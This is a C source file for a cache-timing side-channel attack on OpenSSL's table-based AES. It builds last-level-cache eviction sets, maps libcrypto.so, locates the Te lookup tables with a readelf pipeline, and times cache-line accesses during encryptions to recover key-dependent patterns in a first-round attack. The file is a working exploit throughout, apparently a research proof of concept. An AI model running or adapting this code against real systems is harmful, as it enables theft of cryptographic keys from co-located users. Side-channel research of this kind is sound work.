#include <fcntl.h>
#include <openssl/aes.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

#include "cacheutils.h"

#define XEON
#include "functions.h"

// more encryptions show features more clearly
#define NUMBER_OF_ENCRYPTIONS_VISUAL 1000
#define NUMBER_OF_MEASUREMENTS 3

#define EV_BUFFER (1024 * 1024 * 1024)

unsigned char key[] = {
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
};

char *eviction;

int get_set(size_t paddr) { return (paddr >> 6) & 2047; }

void evict(size_t *set, int len) {
  mfence();
  for (size_t i = 1; i < len - 2; i++) {
    maccess(set[i]);
    maccess(set[i + 1]);
    maccess(set[i]);
    maccess(set[i + 1]);
    maccess(set[i]);
    maccess(set[i + 1]);
    maccess(set[i]);
    maccess(set[i + 1]);
    maccess(set[i]);
    maccess(set[i + 1]);
  }
  mfence();
}

void build_eviction_set(size_t *evset, int len, size_t phys_target) {
  int target_set = get_set(phys_target);
  int target_slice = compute_slice(phys_target);
  int evcnt = 0;
  size_t candidate = (size_t)eviction + ((target_set << 6) % 4096) + 4096 * 8;
  while (evcnt < len && candidate < (size_t)eviction + EV_BUFFER) {
    size_t p = get_physical_address(candidate);
    if (get_set(p) == target_set && compute_slice(p) == target_slice) {
      evset[evcnt++] = candidate;
    }
    candidate += 4096;
  }
  if (evcnt < len) {
    printf("Failed to build eviction set\n");
    exit(-1);
  }
  //   printf("Found %d addresses for the eviction set\n", evcnt);
}

int WAYS;

AES_KEY key_struct;

char *base;
char *probe;
char *end;

void simple_first_round_attack(size_t offset) {
  unsigned char plaintext[] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
  unsigned char ciphertext[128];
  srand(0);
  size_t sum = 0;
  size_t timings[16][16];
  memset(timings, 0, sizeof(timings));
  size_t min = -1ull, max = 0;

#if ATTACK == PRIMEPROBE || ATTACK == EVICTRELOAD
  size_t evset[16][64];
  for (int i = 0; i < 16; i++) {
    printf("Building eviction set %d/16\n", i + 1);
    build_eviction_set(evset[i], WAYS + 4,
                       get_physical_address(base + offset + 64 * i));
  }
#endif

  size_t start_time = rdtsc();
  struct timespec t1;
  clock_gettime(CLOCK_MONOTONIC, &t1);
  uint64_t start_time_wall = t1.tv_sec * 1000 * 1000 * 1000ULL + t1.tv_nsec;
  for (size_t byte = 0; byte < 256; byte += 16) {
    plaintext[0] = byte;

    AES_encrypt(plaintext, ciphertext, &key_struct);

    int addr = 0;
    for (probe = base + offset; probe < base + offset + 0x400; probe += 64) {
      size_t count = 0;
      for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS_VISUAL; ++i) {
        for (size_t j = 1; j < 16; ++j) {
          plaintext[j] = rand() % 256;
        }

        size_t min_delta = -1ull, max_delta = 0;
        for (int r = 0; r < NUMBER_OF_MEASUREMENTS; r++) {
          evict(evset[addr], WAYS);
          for (int ar = 0; ar < 2; ar++)
            AES_encrypt(plaintext, ciphertext, &key_struct);

          size_t start = rdtsc();
          maccess(probe);
          size_t delta = rdtsc() - start;
          if (delta < min_delta)
            min_delta = delta;
          if (delta > max_delta)
            max_delta = delta;
        }
        count += min_delta;
      }
      timings[addr++][byte / 16] = count;
      if (count < min)
        min = count;
      if (count > max)
        max = count;
      sum += count;
      sched_yield();
    }
  }

  FILE *f = fopen("hist.csv", "w");
  int correct_max = 0, correct_min = 0;
  for (int y = 0; y < 16; y++) {
    size_t row_max = 0, row_min = -1ull;
    for (int x = 0; x < 16; x++) {
      if (timings[y][x] < row_min)
        row_min = timings[y][x];
      if (timings[y][x] > row_max)
        row_max = timings[y][x];
    }
    for (int x = 0; x < 16; x++) {
      printf("\x1b[4%dm%6zu  \x1b[0m",
             timings[y][x] == row_max   ? 1
             : timings[y][x] == row_min ? 2
                                        : 0,
             timings[y][x]);
      fprintf(f, "%zd%s", timings[y][x], x != 15 ? "," : "");
      if (x == y) {
        if (timings[y][x] == row_max)
          correct_max++;
        if (timings[y][x] == row_min)
          correct_min++;
      }
    }
    fprintf(f, "\n");
    printf("\n");
  }
  size_t total_time = rdtsc() - start_time;
  clock_gettime(CLOCK_MONOTONIC, &t1);
  size_t time_wall =
      (t1.tv_sec * 1000 * 1000 * 1000ULL + t1.tv_nsec) - start_time_wall;

  fclose(f);
  if (correct_max == 16 || correct_min == 16) {
    printf("\n\x1b[32mCORRECT!\x1b[0m\n");
  } else {
    printf("\n\x1b[31mFAILURE!\x1b[0m\n");
  }
  printf("Time: %zd ms (%zd cycles)\n", time_wall / 1000000, total_time);
}

char __attribute__((aligned(4096))) evtest[4096];

int main() {
  eviction = malloc(EV_BUFFER);
  memset(eviction, 1, EV_BUFFER);
  madvise(eviction, sizeof(eviction), MADV_HUGEPAGE);

  CACHE_MISS = detect_flush_reload_threshold();
  printf("Cache miss: %zd\n", CACHE_MISS);

  int fd = open("./openssl/libcrypto.so", O_RDONLY);
  size_t size = lseek(fd, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if ((map_size & 0xFFF) != 0) {
    map_size |= 0xFFF;
    map_size += 1;
  }
  base = (char *)mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
  end = base + size;

  AES_set_encrypt_key(key, 128, &key_struct);

  size_t offset[4];
  char offset_s[128];
  FILE *f;
  for (int i = 0; i < 4; i++) {
    char cmd[1024];
    sprintf(cmd,
            "readelf -a ./openssl/libcrypto.so | grep Te%d | grep -oE ': "
            "[a-z0-9]*' | awk '{print $2}'",
            i);
    f = popen(cmd, "r");
    !fgets(offset_s, sizeof(offset_s) - 1, f);
    offset[i] = strtoull(offset_s, 0, 16);
    fclose(f);
  }
  printf("%zx %zx %zx %zx\n", offset[0], offset[1], offset[2], offset[3]);

  memset(evtest, 2, sizeof(evtest));
  char set[64];
  build_eviction_set(set, 64, get_physical_address(evtest));

  size_t maxdiff = 0, maxdiff_i = 0, maxdiff_t = 0;
  for (int i = 8; i < 24; i++) {
    size_t t1, t2, start;
    sched_yield();

    mfence();
    evict(set, i + 1);
    mfence();
    maccess(evtest);
    mfence();
    start = rdtsc();
    evict(set, i);
    t1 = rdtsc() - start;

    sched_yield();

    mfence();
    evict(set, i);
    mfence();
    start = rdtsc();
    evict(set, i);
    t2 = rdtsc() - start;

    printf("%2d: %zd - %zd\n", i, t1, t2);
    if (t1 > t2 && (t1 - t2) > maxdiff) {
      maxdiff = t1 - t2;
      maxdiff_i = i;
      maxdiff_t = (t2 * 2 + t1) / 2;
    }
  }
  CACHE_MISS = maxdiff_t;
  WAYS = maxdiff_i;
  printf("Ways: %d, Threshold: %zd\n", WAYS, CACHE_MISS);
  WAYS++;
  WAYS = 18;
  simple_first_round_attack(offset[0]);

  close(fd);
  munmap(base, map_size);
  fflush(stdout);
  return 0;
}
